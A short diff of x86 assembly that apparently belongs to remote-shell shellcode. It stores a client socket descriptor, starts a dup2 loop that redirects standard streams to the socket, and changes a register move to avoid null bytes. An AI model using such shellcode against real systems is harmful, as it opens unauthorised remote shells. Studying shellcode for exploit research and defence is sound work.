@@ -57,7 +57,7 @@ _start:
 
 	mov ebx, eax		; store client sockfd
 
-	mov ecx, 0x3		; Move 3 into ecx for the loop operation
+	mov cl, 0x3		; Move 3 into ecx for the loop operation
 	mov esi, 0xFFFFFFFD	; Move -3 into esi
 dup:
         ; dup2(oldfd, newfd)
